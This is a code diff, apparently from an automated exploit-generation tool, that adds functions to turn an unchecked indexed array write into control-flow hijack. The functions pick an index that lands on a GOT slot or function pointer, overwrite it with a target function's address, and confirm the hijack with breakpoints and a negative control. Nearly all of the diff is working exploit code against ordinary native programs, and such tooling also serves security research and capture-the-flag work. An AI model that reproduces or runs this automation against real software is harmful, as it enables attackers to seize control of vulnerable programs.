@@ -181,6 +181,18 @@ def chain_primitive_stage(ctx) -> dict:
                                     blame=f"tcache-poison chunk over {hex(tgt)}", writer=trig,
                                     off=None, trig=trig, exe=exe)
             else:
+                # CWE-129/787 indexed write -> write-what-where on a GOT slot / fn-pointer. The
+                # index selects the address, so the target can be the whole GOT, not just a byte
+                # offset inside the array (what _search_hijack walks below).
+                if vclass == "oob_write":
+                    ow = _oob_write_hijack(ctx, capture, target_bytes, exe, opts, model, win_addr,
+                                           width=width)
+                    if ow:
+                        seq, writer, idx, tgt_addr, trig, tgt_name = ow
+                        return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
+                                        blame=(f"option {writer} writes index {idx} "
+                                               f"({tgt_name} at {hex(tgt_addr)}) := &{win_name}"),
+                                        writer=writer, off=None, trig=trig, exe=exe)
                 # heap overflow / oob write -> overwrite an adjacent code pointer directly
                 alloc = next((o for o in opts if o in model and menu._is_alloc(model[o])), None)
                 prime = (2 * (menu._scalar(alloc.encode(), width)
@@ -324,6 +336,90 @@ def _pie_leak_chain(ctx, target_bytes, exe, win, opts, model, width, workdir):
                     ctx.progress(msg=f"PIE hijack: leak {leak_opt} -> base -> option {writer} "
                                      f"writes base+{win_vaddr:#x} at +{off} -> {win_name} ran")
                     return leak_opt, writer, off, trig, base
+    return None
+
+
+def _oob_write_seq(writer, fields, idx, value, trig, model, width) -> bytes:
+    """Drive ONE indexed write: select `writer`, supply `idx` for its index field and `value` for
+    its value field (menu._fill types each field), then optionally fire `trig` to force the call
+    through the overwritten slot. The value is sent as a decimal (a `scanf("%ld")`/atoi value cell)
+    -- the dominant CWE-129 write-a-cell shape; a raw-byte value cell is covered by the sequential
+    _search_hijack path."""
+    from ..fuzz import menu
+    drive = menu._scalar(writer.encode(), width) + menu._fill(
+        fields, idx=str(idx).encode(), num=str(value).encode(), width=width)
+    if trig is None:
+        return drive
+    return drive + menu._scalar(trig.encode(), width) + menu._fill(model.get(trig, []), width=width)
+
+
+def _oob_write_hijack(ctx, capture, target_bytes, exe, opts, model, win_addr, *, width=None):
+    """CWE-129/787 unchecked indexed write -> control-flow hijack (a write-WHAT-WHERE, not a
+    sequential overflow). A menu option computes `arr[idx] = value` with no bound check on `idx`;
+    choosing `idx` so `arr_base + idx*stride` lands on a GOT slot (or a called-through global
+    function pointer) and `value = win_addr` overwrites that pointer, so the next call through it
+    enters win. _search_hijack walks byte offsets in one buffer; here the INDEX is the address
+    selector, so the whole GOT (and writable fn-pointers) are reachable, well outside the array.
+
+    Searches (array, write option, target slot, trigger). Confirm = the win breakpoint is hit AND a
+    negative control (value replaced with a benign address) does NOT hit it, proving the overwrite
+    -- not incidental flow -- caused arrival. Returns (seq, writer, idx, target_addr, trig, name)
+    or None. Bounded; early-exits on the first confirmed hijack. Non-PIE (absolute GOT/global
+    addresses); a PIE target's indexed write is handled by the leak-relocating _pie_leak_chain."""
+    from ..dynamic import oob_index
+    from . import exploit, rop
+
+    arrays = (oob_index._array_candidates(exploit.elf_objects_sized(target_bytes))
+              or oob_index._array_candidates_symfree(Path(exe)))
+    if not arrays:
+        return None
+
+    # arbitrary-write targets: every GOT slot (overwriting it redirects that libc call), ordered so
+    # the functions a menu loop re-calls come first -- their call is the implicit next-prompt
+    # trigger, so a hijack confirms with trig=None and the search stays short. Writable global
+    # function pointers referenced by the code are appended as secondary targets.
+    got = rop.got_entries(target_bytes)
+    _HOT = ("printf", "puts", "fwrite", "fflush", "putchar", "fputs", "__printf_chk",
+            "fgets", "scanf", "__isoc99_scanf", "read", "write")
+    got_targets = sorted(got.items(),
+                         key=lambda kv: (_HOT.index(kv[0]) if kv[0] in _HOT else 99, kv[0]))
+    targets = [(a, f"{n}@got") for n, a in got_targets]
+    targets += [(a, f"fnptr@{a:x}") for a in _writable_globals(exe) if a not in got.values()]
+    if not targets:
+        return None
+
+    # write options: an option whose template reads an index AND at least one more scalar (the value
+    # cell). Fall back to any index-taking option (the crawl may have learned only the index field).
+    writers = [o for o in opts if o in model and "idx" in model[o] and len(model[o]) >= 2] or \
+              [o for o in opts if o in model and "idx" in model[o]]
+    if not writers:
+        return None
+    triggers = [None] + [o for o in opts if o in model][:3]
+
+    attempts = 0
+    for arr in arrays:
+        base, stride, cap = arr["addr"], arr.get("stride", 8), arr["cap"]
+        for tgt_addr, tgt_name in targets:
+            if stride <= 0 or (tgt_addr - base) % stride:
+                continue
+            idx = (tgt_addr - base) // stride
+            if not (-(cap + 4096) <= idx <= cap + 4096):     # a plausibly-unchecked index, bounded
+                continue
+            for writer in writers:
+                fields = model[writer]
+                for trig in triggers:
+                    if ctx.should_cancel() or attempts >= 240:
+                        return None
+                    attempts += 1
+                    seq = _oob_write_seq(writer, fields, idx, win_addr, trig, model, width)
+                    if not exploit.reached(capture(seq, breakpoints=[win_addr]), win_addr):
+                        continue
+                    neg = _oob_write_seq(writer, fields, idx, win_addr ^ 0xFFFF, trig, model, width)
+                    if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
+                        continue                             # reached without our value -> not ours
+                    ctx.progress(msg=f"indexed-write hijack: option {writer} sets "
+                                     f"{arr['name']}[{idx}] ({tgt_name}) := win -> win reached")
+                    return seq, writer, idx, tgt_addr, trig, tgt_name
     return None
 
 
